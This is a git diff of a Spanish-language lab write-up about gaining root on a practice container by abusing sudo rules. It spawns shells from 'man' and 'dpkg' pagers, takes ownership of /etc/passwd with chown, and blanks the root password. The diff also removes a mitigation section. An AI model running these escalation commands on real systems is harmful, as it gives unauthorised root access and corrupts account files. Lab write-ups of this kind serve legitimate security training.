@@ -142,7 +142,7 @@ listening on [any] 443 ...
 
 ### 3.3. Estabilización de TTY
 
-Para evitar inconvenientes y convertir esta terminar remota limitada en una terminal funcional y completa, se realizó tratamiento TTY. Es necesario realizarlo para continuar con el laboratorio.
+Para evitar inconvenientes y convertir esta terminal remota limitada en una terminal funcional y completa, se realizó tratamiento TTY. Es necesario realizarlo para continuar con el laboratorio.
 
 ```bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
@@ -165,7 +165,7 @@ User www-data may run the following commands on 9233486e355a:
 El usuario puede ejecutar `/bin/man` como **pingu** y sin contraseña.
 
 
-Ejeución de `man` como **pingu**:
+Ejecución de `man` como **pingu**:
 
 ```bash
 sudo -u pingu /usr/bin/man man
@@ -177,7 +177,7 @@ sudo -u pingu /usr/bin/man man
 
 ### 3.4. Escalada a user gladys
 
-Se ejecutó `sudo -l` para ver los privilegios disponibles de **pingu**. 
+Se ejecutó `sudo -l` para ver los privilegios disponibles de **pingu** y vemos que puede ejecutar tanto `/bin/nmap` como `/bin/dpkg` con privilegios de la usuario **gladys**. 
 
 ```bash
 User pingu may run the following commands on 9233486e355a:
@@ -185,35 +185,44 @@ User pingu may run the following commands on 9233486e355a:
     (gladys) NOPASSWD: /usr/bin/dpkg
 ```
 
+En este caso, se usó `/bin/dpkg` para pivotar al usuario **gladys**, utilizando el método de los paginadores visto anteriormente.
+
 ```bash
 sudo -u gladys /usr/bin/dpkg -l
 !/bin/bash
 ```
 
+<img width="460" height="103" alt="Captura de pantalla (362)" src="https://github.com/user-attachments/assets/f3dafae2-0d03-4f07-8827-7fdec125a870" />
+
+
 ### 3.4. Escalada a root
 
-Se ejecutó `sudo -l` para ver los privilegios disponibles de **gladys**. 
+Se ejecutó `sudo -l` para ver los privilegios disponibles de **gladys** y se observa que puede ejecutar `/bin/chown` sin contraseña, lo que permite cambiar el propietario de cualquier archivo del sistema. 
 
 ```bash
 User gladys may run the following commands on 9233486e355a:
     (root) NOPASSWD: /usr/bin/chown
 ```
 
-```bash
-sudo chown $(id -un):$(id -gn) /etc/passwd
-ls -la /etc/passwd
-```
-
+Para abusar de `chown` primero se cambió el propietario de `/bin/passwd` al usuario actual, obteniendo los permisos necesarios para modificarlo.
 
 ```bash
-echo "alberto::0:0:root:/root:/bin/bash" >> /etc/passwd
-su alberto
+sudo /usr/bin/chown $(id -un):$(id -gn) /etc/passwd
 ```
 
+Luego, se eliminó la contraseña de `root`.
+
+```bash
+sed 's/^root:[^:]*:/root::/' /etc/passwd > /tmp/passwd.tmp
+cp /tmp/passwd.tmp /etc/passwd
+```
+
+Para finalizar, se accedió a `root`.
+
+```bash
+su root
+whoami
+root
+```
  
----
-## Acciones de mitigación
-- **Divulgación de usuarios válidos en página web pública**: nunca divulgar información sensible en servicios públicos, utilizar redes internas y seguras para transmitir información.
-- **Contraseña débil vulnerable a ataques de fuerza bruta**: aplicar políticas de contraseñas más seguras e implementar verificación en dos pasos (MFA).
-- **Escalada de privilegios mediante`/bin/ruby`**: aplicar principio de menor privilegio, eliminar `/bin/ruby` de sudoers.
 ---
